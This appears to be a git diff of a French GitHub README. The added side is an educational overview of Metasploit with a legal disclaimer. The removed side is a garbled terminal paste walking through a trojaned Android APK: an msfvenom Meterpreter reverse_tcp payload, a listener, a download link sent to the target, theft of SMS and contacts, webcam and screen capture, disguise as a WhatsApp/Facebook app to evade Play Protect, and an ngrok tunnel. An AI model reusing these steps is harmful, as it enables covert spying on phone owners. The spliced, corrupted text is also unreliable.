@@ -1,117 +1,90 @@
-# Vomazyd4s-
-Site officiel de SuaRra Negus — création de sites web professionnels, solutions digitales et services business.
-(Run: “touch ~/.hushlogin” to hide this message)
-┌──(userland㉿localhost)-[~]
-└─$ msfvenom -p android/meterpreter/reverse_tcp \
->   LHOST=192.168.1.100 \        # TON IP Kali (ifconfig wlan0)
--bash: msfvenom: command not found
+# Metasploit Framework
 
-┌──(userland㉿localhost)-[~]
-└─$   LPORT=4444 \                 # Port d'\303\25
-1coute
--bash:  : command not found
+## 📌 Description
+Metasploit Framework est une plateforme open-source de **tests de pénétration** utilisée par les professionnels de la cybersécurité pour :
+- Identifier des vulnérabilités
+- Tester la sécurité des systèmes
+- Valider des correctifs
+- Former à la cybersécurité offensive (ethical hacking)
 
-└─$   AndroidMeterpreter.apk       # Nom du fichier APK
-msfconsoleuse exploit/multi/handler
-rse_tcp
-set LHOST 192.168.1.100          # Même IP que msfvenom
-set LPORT 4444                   # Même port
-set ExitOnSession false          # Garde la session ouverte
-exploit -j                       # Lance en arrière-plan-bash: AndroidMeterpreter.apk: command not found
+⚠️ **Ce projet est destiné uniquement à un usage légal et éducatif.**
 
-┌──(userland㉿localhost)-[~]
-└─$ set payload android/meterpreter/reverse_tcp
+---
 
-┌──(userland㉿localhost)-[~]
-└─$ set LHOST 192.168.1.100          # M\303\25
-2me IP que msfvenom
+## 🎯 Objectifs du projet
+- Apprendre le fonctionnement du framework Metasploit
+- Comprendre les concepts de base du pentesting
+- Simuler des attaques **dans un environnement contrôlé**
+- Renforcer la sécurité des systèmes informatiques
 
-┌──(userland㉿localhost)-[~]
-└─$ set LPORT 4444                   # M\303\25
-2me port
+---
 
-┌──(userland㉿localhost)-[~]
- ouverteExitOnSession false          # Garde la session
+## 🧠 Concepts clés
+- **Exploit** : code qui exploite une vulnérabilité
+- **Payload** : charge exécutée après l’exploitation
+- **Listener** : service qui attend une connexion
+- **Session** : connexion active avec une machine cible
+- **Post-exploitation** : analyse après accès
 
-└─$ exploit -j                       # Lance en arri\30
-3\250re-plan# Terminal s\303\251par\303
-\251
--bash: exploit: command not found
+---
 
-┌──(userland㉿localhost)-[~]
-└─$ cd /chemin/vers/AndroidMeterpreter.apk
--bash: cd: /chemin/vers/AndroidMeterpreter.apk: No such file or directory
+## 🛠️ Outils utilisés
+- Metasploit Framework
+- Ruby
+- PostgreSQL
+- Environnements de test (VM, lab local)
 
-┌──(userland㉿localhost)-[~]
-└─$ python3 -m http.server 8080
--bash: python3: command not found
+---
 
-┌──(userland㉿localhost)-[~]
-└─$ # Lien \303\240 envoyer : http://192.168.1.
-100:8080/AndroidMeterpreter.apksessions -l     # Liste sessions actives
+## 🧪 Environnement recommandé
+- Linux (Kali Linux, Ubuntu, Parrot OS)
+- Machine virtuelle (VirtualBox / VMware)
+- Réseau local isolé
+- Machines de test autorisées uniquement
 
-┌──(userland㉿localhost)-[~]
-└─$ sessions -i 1   # Entre dans la session 1sysinfo
--bash: sessions: command not found
+---
 
-┌──(userland㉿localhost)-[~]
-└─$ getuid
--bash: getuid: command not found
+## 📚 Contenu pédagogique
+Ce dépôt peut contenir :
+- Documentation théorique
+- Notes d’apprentissage
+- Scripts de démonstration
+- Exemples de modules (sans usage malveillant)
+- Scénarios de laboratoire (labs)
 
-┌──(userland㉿localhost)-[~]
-└─$ dump_sms
--bash: dump_sms: command not found
+---
 
-┌──(userland㉿localhost)-[~]
-└─$ dump_contacts
--bash: dump_contacts: command not found
+## ⚖️ Avertissement légal
+❗ L’utilisation de Metasploit sur des systèmes **sans autorisation explicite** est **illégale**.
 
-┌──(userland㉿localhost)-[~]
-└─$ webcam_stream -i 1 -d 5  # Vid\303\251o 5s
--bash: webcam_stream: command not found
+Ce dépôt est fourni :
+- À des fins éducatives
+- Pour la recherche en sécurité
+- Pour l’apprentissage du pentesting éthique
 
-┌──(userland㉿localhost)-[~]
-└─$ shell
--bash: shell: command not found
+L’auteur décline toute responsabilité en cas de mauvaise utilisation.
 
-┌──(userland㉿localhost)-[~]
-└─$ input keyevent 82         # Menu
--bash: input: command not found
+---
 
-┌──(userland㉿localhost)-[~]
-└─$ screencap -p /sdcard/screenshot.png
--bash: screencap: command not found
+## 📖 Ressources utiles
+- Documentation officielle Metasploit
+- OWASP Top 10
+- MITRE ATT&CK Framework
+- Cybersécurité offensive & défensive
 
-┌──(userland㉿localhost)-[~]
-k -x AndroidMeterpreter.apk4# APK bloqu\303\251 parf apk
- Play Protect ?
-to/legit.apk  # Template WhatsApp/Facebook
+---
 
-# Target pas sur même réseau ?
-ngrok tcp 4444  # Tunnel public
-set LHOST 0.tcp.ngrok.io
-set LPORT 12345-bash: download: command not found
+## 👤 Auteur
+**Laflamme134-collab**  
+Projet éducatif en cybersécurité & solutions digitales
 
-┌──(userland㉿localhost)-[~]
-sApp/Facebook... -x /path/to/legit.apk  # Template Whats
--bash: msfvenom: command not found
+---
 
-┌──(userland㉿localhost)-[~]
-└─$
+## ⭐ Remarque
+Si vous débutez :
+👉 Commencez par comprendre les bases réseau (IP, ports, protocoles)  
+👉 Travaillez uniquement sur des machines de test
 
-┌──(userland㉿localhost)-[~]
-└─$ # Target pas sur m\303\252me r\303\
-251seau ?
+---
 
-┌──(userland㉿localhost)-[~]
-└─$ ngrok tcp 4444  # Tunnel public
--bash: ngrok: command not found
-
-┌──(userland㉿localhost)-[~]
-└─$ set LHOST 0.tcp.ngrok.io
-
-┌──(userland㉿localhost)-[~]
-└─$ set LPORT 12345
-/data/user/0/tech.ula/files/support/dbclient: Connection to userland@localhost:2022 exited: Remote closed the connection
-
-[Process completed (code 1) - press Enter]
+© Projet éducatif – Usage responsable uniquement
